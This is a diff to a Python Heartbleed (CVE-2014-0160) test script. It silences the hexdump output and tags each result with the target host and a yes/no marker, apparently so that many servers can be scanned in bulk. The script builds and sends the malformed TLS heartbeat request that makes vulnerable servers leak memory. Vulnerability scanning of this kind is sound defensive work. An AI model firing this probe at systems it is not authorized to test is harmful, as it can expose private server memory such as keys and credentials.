@@ -8,6 +8,8 @@ import select
 import re
 from optparse import OptionParser
 
+check_machine = ""
+
 options = OptionParser(usage='%prog server [options]', description='Test for SSL heartbeat vulnerability (CVE-2014-0160)')
 options.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')
 options.add_option('-s', '--starttls', type='string', default='', help='STARTTLS protocol: smtp, pop3, imap, ftp, or xmpp')
@@ -293,7 +295,7 @@ def recvall(s, length, timeout=4):
         r, w, e = select.select([s], [], [], timeout)
         if s in r:
             data = s.recv(remain)
-            print hexdump(data)
+            #print hexdump(data)
             # EOF?
             if not data:
                 return None
@@ -305,7 +307,7 @@ def recvall(s, length, timeout=4):
 def recvmsg(s):
     hdr = recvall(s, 5)
     if hdr is None:
-        print 'Unexpected EOF receiving record header - server closed connection'
+        #print 'Unexpected EOF receiving record header - server closed connection'
         return None, None, None
     typ, ver, ln = struct.unpack('>BHH', hdr)
 
@@ -316,32 +318,32 @@ def recvmsg(s):
 
     pay = recvall(s, ln, 3)
     if pay is None:
-        print 'Unexpected EOF receiving record payload - server closed connection'
+        #print 'Unexpected EOF receiving record payload - server closed connection'
         return None, None, None
-    print ' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay))
+    #print ' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay))
     return typ, ver, pay
 
-def hit_hb(s):
+def hit_hb(s, check_machine):
     s.send(hb)
     while True:
         typ, ver, pay = recvmsg(s)
         if typ is None:
-            print 'No heartbeat response received, server likely not vulnerable'
+            print "%s : No heartbeat response received, server likely not vulnerable ##no##" % check_machine
             return False
 
         if typ == 24:
-            print 'Received heartbeat response:'
-            hexdump(pay)
+            #print 'Received heartbeat response:'
+            #hexdump(pay)
             if len(pay) > 3:
-                print 'WARNING: server returned more data than it should - server is vulnerable!'
+                print "%s : WARNING: server returned more data than it should - server is vulnerable! ##yes##" % check_machine
             else:
-                print 'Server processed malformed heartbeat, but did not return any extra data.'
+                print "%s : Server processed malformed heartbeat, but did not return any extra data.##yes##" % check_machine
             return True
 
         if typ == 21:
-            print 'Received alert:'
-            hexdump(pay)
-            print 'Server returned error, likely not vulnerable'
+            #print 'Received alert:'
+            #hexdump(pay)
+            print "%s : Server returned error, likely not vulnerable. ##no##" % check_machine
             return False
 
 def getSSLRecords(strBuf):
@@ -429,12 +431,12 @@ def main():
 
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-    print 'Connecting...'
-
+    check_machine = args[0]
+    print "Connecting...%s" % check_machine
     s.connect((args[0], opts.port))
 
-    if opts.starttls != '':
-      print 'Sending STARTTLS Protocol Command...'
+    #if opts.starttls != '':
+      #print 'Sending STARTTLS Protocol Command...'
 
     if opts.starttls == 'smtp':
       s.recv(BUFSIZ)
@@ -462,16 +464,16 @@ def main():
       s.send("<stream:stream xmlns:stream='http://etherx.jabber.org/streams' xmlns='jabber:client' to='%s' version='1.0'\n")
       s.recv(BUFSIZ)
 
-    print 'Sending Client Hello...'
+    #print 'Sending Client Hello...'
 
     hello = makeHello("TLSv1")
     s.send(hello)
-    print hexdump(hello)
-    print 'Waiting for Server Hello...'
+    #print hexdump(hello)
+    #print 'Waiting for Server Hello...'
     while True:
         try:
             typ, ver, pay = recvmsg(s)
-            print hexdump(pay)
+            #print hexdump(pay)
             if typ == None:
                 print 'Server closed connection without sending Server Hello.'
                 return
@@ -481,14 +483,14 @@ def main():
         except:
            break
 
-    print 'Sending heartbeat request...........................................'
+    #print 'Sending heartbeat request...........................................'
     sys.stdout.flush()
     if ver:
         hb = h2bin("18%04x0003014000" % ver)
     else:
         hb = h2bin("1803020003014000")
-    print hexdump(hb)
+    #print hexdump(hb)
     s.send(hb)
-    hit_hb(s)
+    hit_hb(s, check_machine)
 if __name__ == '__main__':
     main()
